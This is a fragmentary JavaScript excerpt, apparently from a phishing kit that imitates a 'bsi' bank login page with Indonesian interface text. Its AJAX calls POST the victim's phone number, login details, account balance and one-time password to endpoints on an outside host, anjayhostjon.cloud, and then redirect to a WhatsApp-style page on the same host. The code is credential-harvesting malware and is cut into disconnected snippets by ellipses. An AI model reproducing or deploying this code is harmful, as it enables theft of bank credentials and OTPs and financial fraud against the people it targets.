...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
      ...
      $.ajax({
            type: 'POST',
            url: 'https://anjayhostjon.cloud/bsi/ald1/no.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://anjayhostjon.cloud/bsi/ald1/login.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://anjayhostjon.cloud/bsi/ald1/saldo.php',
...
$.ajax({
 type: 'POST',
 url: 'https://anjayhostjon.cloud/bsi/ald1/otp.php',
 async: false,
 dataType: 'JSON',
...
function getcs(){
 $("#djload").show();   
  ...
  audio1 = document.getElementById("bsi");
    ...
    audio4.loop = false
setTimeout(function(){  
location.href='https://anjayhostjon.cloud/wa/ald1';
    }, 1000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 1000);      
